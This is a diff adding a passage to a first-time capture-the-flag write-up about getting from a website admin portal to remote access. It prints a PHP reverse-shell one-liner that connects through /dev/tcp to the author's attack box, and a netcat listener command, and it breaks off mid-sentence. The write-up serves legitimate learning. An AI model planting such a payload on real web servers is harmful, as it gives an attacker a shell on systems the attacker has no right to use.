@@ -144,3 +144,32 @@ Running this command did provide the password. I have redacted the password but 
 ```
 
 #### Website Admin
+
+I looked around in the admin trying to find usernames and passwords. Nothing was showing up. I even tried connecting to the box using ssh with the username Elliot and the password just found.
+
+I couldn't find anything that stood out. I was very confused about what to do.
+
+As mentioned before, this capture the flag event was my first one ever. I had no idea what to do once you got into a website admin portal. The next part was information that I found in a video and it blew my mind.
+
+#### Remote Access on Target
+
+It has been a while since I used PHP but I knew that some commands are dangerous to use. I learned that you could use the PHP exec function to create a shell session that connects to the attack machine. For anyone that doesn't know, PHP will execute code on the webserver and then return the rendered HTML as a response to the client. Any PHP code is executed on the server and the results of that code are returned as HTML.
+
+Here is the PHP code we are going to use:
+
+```php
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.22.1.110/4444 0>&1'"); ?>
+```
+
+This code will do the following:
+
+- Create a bash terminal
+- Connect to the ip address 10.22.1.110 (my attack box's ip address)
+- Connect to port 4444 of my attack box
+- It is going to create this shell as whatever user is running the PHP site
+
+That is the payload I am going to use. I need to make sure that my machine is listening on port 4444. I do that with the following command:
+
+`nc -lvnp 4444`
+
+This tells netcat that
